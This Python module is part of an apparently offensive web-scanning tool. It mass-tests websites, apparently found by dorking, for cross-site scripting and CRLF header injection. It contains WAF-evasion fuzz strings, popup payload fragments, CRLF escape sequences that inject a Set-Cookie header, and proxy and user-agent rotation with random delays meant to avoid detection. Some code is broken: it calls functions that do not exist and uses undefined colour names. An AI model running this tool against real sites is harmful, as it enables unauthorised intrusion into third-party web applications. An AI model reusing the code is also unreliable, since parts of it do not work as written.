#########################################################################################
# XSS Vulnerability testing functions
#########################################################################################
import glob
import random
import re
import sys
import concurrent.futures
import threading
import time
from urllib.parse import urlparse

import bs4
import requests
from termcolor import cprint
from tqdm import tqdm

from attacks.dorks.google_dorking import get_proxies_and_cycle
from utils.web_scraper import scrape_links_from_url
from utils.proxies_manager import prepare_proxies, round_robin_proxies
from utils.waf_mitigation import waf_detector
from utils.app_config import (
    USER_AGENTS,
)
from utils.request_manager import inject_params, inject_payload

try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
except ImportError:
    print(
        "Selenium and webdriver_manager modules not found. Please make sure they are installed."
    )
    sys.exit(1)

blindParams = [  # common paramtere names to be bruteforced for parameter discovery
    "redirect",
    "redir",
    "url",
    "link",
    "goto",
    "debug",
    "_debug",
    "test",
    "get",
    "index",
    "src",
    "source",
    "file",
    "frame",
    "config",
    "new",
    "old",
    "var",
    "rurl",
    "return_to",
    "_return",
    "returl",
    "last",
    "text",
    "load",
    "email",
    "mail",
    "user",
    "username",
    "password",
    "pass",
    "passwd",
    "first_name",
    "last_name",
    "back",
    "href",
    "ref",
    "data",
    "input",
    "out",
    "net",
    "host",
    "address",
    "code",
    "auth",
    "userid",
    "auth_token",
    "token",
    "error",
    "keyword",
    "key",
    "q",
    "query",
    "aid",
    "bid",
    "cid",
    "did",
    "eid",
    "fid",
    "gid",
    "hid",
    "iid",
    "jid",
    "kid",
    "lid",
    "mid",
    "nid",
    "oid",
    "pid",
    "qid",
    "rid",
    "sid",
    "tid",
    "uid",
    "vid",
    "wid",
    "xid",
    "yid",
    "zid",
    "cal",
    "country",
    "x",
    "y",
    "topic",
    "title",
    "head",
    "higher",
    "lower",
    "width",
    "height",
    "add",
    "result",
    "log",
    "demo",
    "example",
    "message",
]

fuzzes = (  # Fuzz strings to test WAFs
    "<test",
    "<test//",
    "<test>",
    "<test x>",
    "<test x=y",
    "<test x=y//",
    "<test/oNxX=yYy//",
    "<test oNxX=yYy>",
    "<test onload=x",
    "<test/o%00nload=x",
    "<test sRc=xxx",
    "<test data=asa",
    "<test data=javascript:asa",
    "<svg x=y>",
    "<details x=y//",
    "<a href=x//",
    "<emBed x=y>",
    "<object x=y//",
    "<bGsOund sRc=x>",
    "<iSinDEx x=y//",
    "<aUdio x=y>",
    "<script x=y>",
    "<script//src=//",
    '">payload<br/attr="',
    '"-confirm``-"',
    "<test ONdBlcLicK=x>",
    "<test/oNcoNTeXtMenU=x>",
    "<test OndRAgOvEr=x>",
)


minEfficiency = 90  # payloads below this efficiency will not be displayed

# attributes that have special properties
specialAttributes = ["srcdoc", "src"]

badTags = ("iframe", "title", "textarea", "noembed", "style", "template", "noscript")

tags = ("html", "d3v", "a", "details")  # HTML Tags

# "Things" that can be used between js functions and breakers e.g. '};alert()//
jFillings = ";"
# "Things" that can be used before > e.g. <tag attr=value%0dx>
lFillings = ("", "%0dx")
# "Things" to use between event handler and = or between function and =
eFillings = ("%09", "%0a", "%0d", "+")
fillings = ("%09", "%0a", "%0d", "/+/")  # "Things" to use instead of space

eventHandlers = {  # Event handlers and the tags compatible with them
    "ontoggle": ["details"],
    "onpointerenter": ["d3v", "details", "html", "a"],
    "onmouseover": ["a", "html", "d3v"],
}

functions = (  # JavaScript functions to get a popup
    "[8].find(confirm)",
    "confirm()",
    "(confirm)()",
    "co\u006efir\u006d()",
    "(prompt)``",
    "a=prompt,a()",
)

defaultEditor = "nano"
blindPayload = ""  # your blind XSS payload
xsschecker = "v3dm0s"  # A non malicious string to check for reflections and stuff


# Load proxies from file
def load_xss_payload():
    """_summary_
    TODO manage vulnebility type
    Returns:
        _type_: _description_
    """
    payloads = []
    for payload_file in glob.glob("attacks/xss/payloads/*"):
        # Extract the vulnerability type from the filename
        with open(payload_file, "r", errors="ignore") as file:
            # Assuming each file may contain multiple payloads, one per line
            payloads.append([line for line in file.readlines()])
    return payloads


def generate_xss_urls(url):
    """
    Adds payload to the URL and returns a set of parsed URLs
    """
    xss_payloads = load_xss_payload()
    injection = "Set-Cookie:nefcore=crlfsuite;"
    parsed_urls = set()
    verify_param = re.compile(r"=[^?\|&]*")
    is_param = verify_param.search(url)

    # Escape characters
    escape_chars = [
        "%0d",
        "%0a",
        "%0d%20",
        "%0a%20",
        "%3f",
        "%0d%0a",
        "%23%0d",
        "%23%0a",
        "%23%0d%0a",
        "%u000a",
        "%25%30%61",
        "%25%30a",
        "%3f%0d",
        "%3f%0d%0a",
        "%3f%0a",
        "%%0a0a",
        "%u000d",
        "%u0000",
        "%0d%09",
        "%0d%0a%09",
        "%0d%0a%20",
        "%25250a",
        "%250a",
        "%2F..%0d%0a",
        "%2f%2e%2e%0d%0a",
        "%25%30",
        "%2e%2e%2f%0d%0a",
        "%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D",
        "%E5%98%8A%E5%98%8D",
        "%e5%98%8a%e5%98%8d%0a",
        "%e5%98%8a%e5%98%8d%0d",
        "%e5%98%8a%e5%98%8d%0d%0a",
        f"\\r",
        f"\\r\\n",
        f"\\r\\t",
        f"\\r\\n\\t",
        f"\\r%20",
        f"\\r\\n%20",
    ]

    # These strings are used before the escape characters
    starting_strings = ["", "crlfsuite", "?crlfsuite=", "#", "__session_start__/"]

    if is_param:
        # cprint(f"URL parameters: {url}", color="yellow", file=sys.stderr)
        del starting_strings[2]
        for string in starting_strings:
            for each_escape in escape_chars:
                injected_urls = inject_params(url, string + each_escape + injection)
                # cprint(
                #     f"Injected URLs: {injected_urls}", color="yellow", file=sys.stderr
                # )
                for each_injected_url in injected_urls:
                    parsed_urls.add(each_injected_url)

        for payloads in xss_payloads:
            for payload in payloads:
                _injected = inject_params(url, payload)
                for injected in _injected:
                    parsed_urls.add(injected)
    else:
        # cprint(f"URL non parameters: {url}", color="yellow", file=sys.stderr)
        if not url.endswith("/"):
            url = url + "/"
        for string in starting_strings:
            for each_escape in escape_chars:
                parsed_urls.add(url + string + each_escape + injection)
        for payloads in xss_payloads:
            for payload in payloads:
                parsed_urls.add(url + payload)
    total_len = len(parsed_urls)

    return parsed_urls, total_len


def test_xss_target(url, proxy, config):
    total_parsed_targets = []
    try:
        cprint(
            f"Intializing Payload Generator for url {url}",
            color="yellow",
            file=sys.stderr,
        )
        parsed_target = generate_xss_urls(url)
        cprint(
            f"Generated {parsed_target[1]} payloads", color="yellow", file=sys.stderr
        )
        for each in parsed_target[0]:
            total_parsed_targets.append(each)

        cprint(
            f"Total Parsed Targets: {len(total_parsed_targets)}",
            color="yellow",
            file=sys.stderr,
        )
    except Exception as e:
        cprint(f"Error generating payloads for {url}: {e}", "red", file=sys.stderr)
        return False, []

    is_waffed = waf_detector(url=url, proxies=proxy, mode="xss")

    if is_waffed:
        cprint(f"WAF detected <!>", color="red", file=sys.stderr)
    else:
        cprint("WAF Status: Offline", color="green", file=sys.stderr)

    secured = False
    proxies = prepare_proxies(proxy, config)

    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "X-HackerOne-Research": "elniak",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip,deflate",
        "Connection": "close",
        "DNT": "1",
        "Upgrade-Insecure-Requests": "1",
    }
    potential_payloads = []
    for payload_url in total_parsed_targets:
        try:
            # TODO take screenshot
            options = Options()
            options.headless = True
            if proxy:
                options.add_argument(f"--proxy-server={proxy}")
            # service=Service('/path/to/chromedriver'),
            driver = webdriver.Chrome(options=options)

            # Create a request interceptor
            def interceptor(request):
                request.headers = headers

            # Set the interceptor on the driver
            driver.request_interceptor = interceptor

            driver.get(url)
            WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.TAG_NAME, "body"))
            )
            html_content = driver.page_source
            driver.quit()

            if payload_url in html_content:
                cprint(f"Payload URL: {payload_url}", color="green", file=sys.stderr)
                potential_payloads.append(payload_url)

            delay = random.uniform(
                config["current_delay"] - 2, config["current_delay"] + 2
            )
            time.sleep(delay)  # Wait before retrying
        except Exception as e:
            cprint(
                f"Error searching Selenium for {payload_url} with proxy {proxies}: {e}",
                "red",
                file=sys.stderr,
            )
            delay = random.uniform(
                config["current_delay"] - 2, config["current_delay"] + 2
            )
            time.sleep(delay)
        # try:
        #     if (
        #         payload_url
        #         in requests.Session()
        #         .get(
        #             payload_url,
        #             proxies=proxies,
        #             headers=headers,
        #             timeout=config["request_delay"],
        #             allow_redirects=True,
        #             verify=secured,
        #         )
        #         .text
        #     ):
        #         cprint(f"Payload URL: {payload_url}", color="green", file=sys.stderr)
        #         potential_payloads.append(payload_url)
        #     delay = random.uniform(
        #         config["current_delay"] - 2, config["current_delay"] + 2
        #     )
        #     time.sleep(delay)  # Wait before retrying
        # except requests.exceptions.ProxyError as e:
        #     cprint(
        #         f"ProxyError searching for {payload_url} with proxy {proxies}: {e}",
        #         "red",
        #         file=sys.stderr,
        #     )
        #     delay = random.uniform(
        #         config["current_delay"] - 2, config["current_delay"] + 2
        #     )
        #     time.sleep(delay)  # Wait before retrying
        # except requests.exceptions.RequestException as e:
        #     cprint(
        #         f"RequestException searching for {payload_url} with proxy {proxies}: {e}",
        #         "red",
        #         file=sys.stderr,
        #     )
        #     delay = random.uniform(
        #         config["current_delay"] - 2, config["current_delay"] + 2
        #     )
        #     time.sleep(delay)  # Wait before retrying

    return len(potential_payloads) > 0, potential_payloads


def base64_encoder(string):
    if re.match(r"^[A-Za-z0-9+\/=]+$", string) and (len(string) % 4) == 0:
        return bs4.b64decode(string.encode("utf-8")).decode("utf-8")
    else:
        return bs4.b64encode(string.encode("utf-8")).decode("utf-8")


def dom(response):
    highlighted = []
    sources = r"""\b(?:document\.(URL|documentURI|URLUnencoded|baseURI|cookie|referrer)|location\.(href|search|hash|pathname)|window\.name|history\.(pushState|replaceState)(local|session)Storage)\b"""
    sinks = r"""\b(?:eval|evaluate|execCommand|assign|navigate|getResponseHeaderopen|showModalDialog|Function|set(Timeout|Interval|Immediate)|execScript|crypto.generateCRMFRequest|ScriptElement\.(src|text|textContent|innerText)|.*?\.onEventName|document\.(write|writeln)|.*?\.innerHTML|Range\.createContextualFragment|(document|window)\.location)\b"""
    scripts = re.findall(r"(?i)(?s)<script[^>]*>(.*?)</script>", response)
    sinkFound, sourceFound = False, False
    for script in scripts:
        script = script.split("\n")
        num = 1
        allControlledVariables = set()
        try:
            for newLine in script:
                line = newLine
                parts = line.split("var ")
                controlledVariables = set()
                if len(parts) > 1:
                    for part in parts:
                        for controlledVariable in allControlledVariables:
                            if controlledVariable in part:
                                controlledVariables.add(
                                    re.search(r"[a-zA-Z$_][a-zA-Z0-9$_]+", part)
                                    .group()
                                    .replace("$", "\$")
                                )
                pattern = re.finditer(sources, newLine)
                for grp in pattern:
                    if grp:
                        source = newLine[grp.start() : grp.end()].replace(" ", "")
                        if source:
                            if len(parts) > 1:
                                for part in parts:
                                    if source in part:
                                        controlledVariables.add(
                                            re.search(r"[a-zA-Z$_][a-zA-Z0-9$_]+", part)
                                            .group()
                                            .replace("$", "\$")
                                        )
                            line = line.replace(source, yellow + source + end)
                for controlledVariable in controlledVariables:
                    allControlledVariables.add(controlledVariable)
                for controlledVariable in allControlledVariables:
                    matches = list(
                        filter(None, re.findall(r"\b%s\b" % controlledVariable, line))
                    )
                    if matches:
                        sourceFound = True
                        line = re.sub(
                            r"\b%s\b" % controlledVariable,
                            yellow + controlledVariable + end,
                            line,
                        )
                pattern = re.finditer(sinks, newLine)
                for grp in pattern:
                    if grp:
                        sink = newLine[grp.start() : grp.end()].replace(" ", "")
                        if sink:
                            line = line.replace(sink, red + sink + end)
                            sinkFound = True
                if line != newLine:
                    highlighted.append("%-3s %s" % (str(num), line.lstrip(" ")))
                num += 1
        except MemoryError:
            pass
    if sinkFound or sourceFound:
        return highlighted
    else:
        return []


# def photon(seedUrl, headers, level, threadCount, delay, timeout, skipDOM):
#     forms = []  # web forms
#     processed = set()  # urls that have been crawled
#     storage = set()  # urls that belong to the target i.e. in-scope
#     schema = urlparse(seedUrl).scheme  # extract the scheme e.g. http or https
#     host = urlparse(seedUrl).netloc  # extract the host e.g. example.com
#     main_url = schema + '://' + host  # join scheme and host to make the root url
#     storage.add(seedUrl)  # add the url to storage
#     checkedDOMs = []

#     def rec(target):
#         processed.add(target)
#         printableTarget = '/'.join(target.split('/')[3:])
#         if len(printableTarget) > 40:
#             printableTarget = printableTarget[-40:]
#         else:
#             printableTarget = (printableTarget + (' ' * (40 - len(printableTarget))))
#         logger.run('Parsing %s\r' % printableTarget)
#         url = getUrl(target, True)
#         params = getParams(target, '', True)
#         if '=' in target:  # if there's a = in the url, there should be GET parameters
#             inps = []
#             for name, value in params.items():
#                 inps.append({'name': name, 'value': value})
#             forms.append({0: {'action': url, 'method': 'get', 'inputs': inps}})
#         response = requester(url, params, headers, True, delay, timeout).text
#         retireJs(url, response)
#         if not skipDOM:
#             highlighted = dom(response)
#             clean_highlighted = ''.join([re.sub(r'^\d+\s+', '', line) for line in highlighted])
#             if highlighted and clean_highlighted not in checkedDOMs:
#                 checkedDOMs.append(clean_highlighted)
#                 logger.good('Potentially vulnerable objects found at %s' % url)
#                 logger.red_line(level='good')
#                 for line in highlighted:
#                     logger.no_format(line, level='good')
#                 logger.red_line(level='good')
#         forms.append(zetanize(response))
#         matches = re.findall(r'<[aA].*href=["\']{0,1}(.*?)["\']', response)
#         for link in matches:  # iterate over the matches
#             # remove everything after a "#" to deal with in-page anchors
#             link = link.split('#')[0]
#             if link.endswith(('.pdf', '.png', '.jpg', '.jpeg', '.xls', '.xml', '.docx', '.doc')):
#                 pass
#             else:
#                 if link[:4] == 'http':
#                     if link.startswith(main_url):
#                         storage.add(link)
#                 elif link[:2] == '//':
#                     if link.split('/')[2].startswith(host):
#                         storage.add(schema + link)
#                 elif link[:1] == '/':
#                     storage.add(main_url + link)
#                 else:
#                     storage.add(main_url + '/' + link)
#     try:
#         for x in range(level):
#             urls = storage - processed  # urls to crawl = all urls - urls that have been crawled
#             # for url in urls:
#             #     rec(url)
#             threadpool = concurrent.futures.ThreadPoolExecutor(
#                 max_workers=threadCount)
#             futures = (threadpool.submit(rec, url) for url in urls)
#             for i in concurrent.futures.as_completed(futures):
#                 pass
#     except KeyboardInterrupt:
#         return [forms, processed]
#     return [forms, processed]


# def checker(url, params, headers, GET, delay, payload, positions, timeout, encoding):
#     checkString = 'st4r7s' + payload + '3nd'
#     if encoding:
#         checkString = encoding(unquote(checkString))
#     response = requester(url, replaceValue(
#         params, xsschecker, checkString, copy.deepcopy), headers, GET, delay, timeout).text.lower()
#     reflectedPositions = []
#     for match in re.finditer('st4r7s', response):
#         reflectedPositions.append(match.start())
#     filledPositions = fillHoles(positions, reflectedPositions)
#     #  Itretating over the reflections
#     num = 0
#     efficiencies = []
#     for position in filledPositions:
#         allEfficiencies = []
#         try:
#             reflected = response[reflectedPositions[num]
#                 :reflectedPositions[num]+len(checkString)]
#             efficiency = fuzz.partial_ratio(reflected, checkString.lower())
#             allEfficiencies.append(efficiency)
#         except IndexError:
#             pass
#         if position:
#             reflected = response[position:position+len(checkString)]
#             if encoding:
#                 checkString = encoding(checkString.lower())
#             efficiency = fuzz.partial_ratio(reflected, checkString)
#             if reflected[:-2] == ('\\%s' % checkString.replace('st4r7s', '').replace('3nd', '')):
#                 efficiency = 90
#             allEfficiencies.append(efficiency)
#             efficiencies.append(max(allEfficiencies))
#         else:
#             efficiencies.append(0)
#         num += 1
#     return list(filter(None, efficiencies))

# def check_filter_efficiency(url, params, headers, GET, delay, occurences, timeout, encoding):
#     positions = occurences.keys()
#     sortedEfficiencies = {}
#     # adding < > to environments anyway because they can be used in all contexts
#     environments = set(['<', '>'])
#     for i in range(len(positions)):
#         sortedEfficiencies[i] = {}
#     for i in occurences:
#         occurences[i]['score'] = {}
#         context = occurences[i]['context']
#         if context == 'comment':
#             environments.add('-->')
#         elif context == 'script':
#             environments.add(occurences[i]['details']['quote'])
#             environments.add('</scRipT/>')
#         elif context == 'attribute':
#             if occurences[i]['details']['type'] == 'value':
#                 if occurences[i]['details']['name'] == 'srcdoc':  # srcdoc attribute accepts html data with html entity encoding
#                     environments.add('&lt;')  # so let's add the html entity
#                     environments.add('&gt;')  # encoded versions of < and >
#             if occurences[i]['details']['quote']:
#                 environments.add(occurences[i]['details']['quote'])
#     for environment in environments:
#         if environment:
#             efficiencies = checker(
#                 url, params, headers, GET, delay, environment, positions, timeout, encoding)
#             efficiencies.extend([0] * (len(occurences) - len(efficiencies)))
#             for occurence, efficiency in zip(occurences, efficiencies):
#                 occurences[occurence]['score'][environment] = efficiency
#     return occurences


def test_vulnerability_xss(config, website_to_test):
    """
    Test a list of websites for XSS vulnerability using multithreading and proxies.
    """
    if len(website_to_test) > 0:

        proxies, proxy_cycle = get_proxies_and_cycle(config)

        vuln_path = []

        if config["do_web_scrap"]:
            # if not skipDOM:
            #     logger.run('Checking for DOM vulnerabilities')
            #     highlighted = dom(response)
            #     if highlighted:
            #         logger.good('Potentially vulnerable objects found')
            #         logger.red_line(level='good')
            #         for line in highlighted:
            #             logger.no_format(line, level='good')
            #         logger.red_line(level='good')

            new_urls = []

            lock = threading.Lock()

            # Now, append a proxy to each task
            number_of_worker = len(proxies)
            search_tasks_with_proxy = []
            for website in website_to_test:
                proxy = next(proxy_cycle)
                search_tasks_with_proxy.append({"website": website, "proxy": proxy})

            with concurrent.futures.ThreadPoolExecutor(
                max_workers=number_of_worker
            ) as executor:
                future_to_search = {
                    executor.submit(
                        scrape_links_from_url, task["website"], task["proxy"]
                    ): task
                    for task in search_tasks_with_proxy
                }
                for website in tqdm(
                    concurrent.futures.as_completed(future_to_search),
                    desc=f"Upating links DB for xss website",
                    unit="site",
                    total=len(future_to_search),
                ):
                    with lock:
                        new_urls += website.result()

            cprint(f"Found {len(new_urls)} new links", color="green", file=sys.stderr)

            # crawl the website for more links TODO

            website_to_test += new_urls

            website_to_test = list(set(website_to_test))

            cprint(
                f"Total links: {len(website_to_test)}",
                color="green",
                file=sys.stderr,
            )

        lock = threading.Lock()
        # Now, append a proxy to each task
        number_of_worker = len(proxies)
        search_tasks_with_proxy = []
        for website in website_to_test:
            proxy = next(proxy_cycle)
            search_tasks_with_proxy.append({"website": website, "proxy": proxy})

        with concurrent.futures.ThreadPoolExecutor(
            max_workers=number_of_worker
        ) as executor:
            future_to_search = {
                executor.submit(
                    test_xss_target, task["website"], task["proxy"], config
                ): task
                for task in search_tasks_with_proxy
            }
            for website in tqdm(
                concurrent.futures.as_completed(future_to_search),
                desc=f"Testing for XSS",
                unit="site",
                total=len(future_to_search),
            ):
                result, payload_url = website.result()
                with lock:
                    if result:
                        vuln_path.append(payload_url)
                        cprint(
                            f"[VULNERABLE XSS] {payload_url}", "green", file=sys.stderr
                        )
                    else:
                        cprint(
                            f"[NOT VULNERABLE XSS] {payload_url}",
                            "red",
                            file=sys.stderr,
                        )

        # if vuln_path:
        #     driver.execute_script("window.open('');")
        #     driver.switch_to.window(driver.window_handles[-1])
        #     for vulnerable_url in vuln_path:
        #         driver.get(vulnerable_url)
    else:
        cprint("No Potential XSS", color="red", file=sys.stderr)
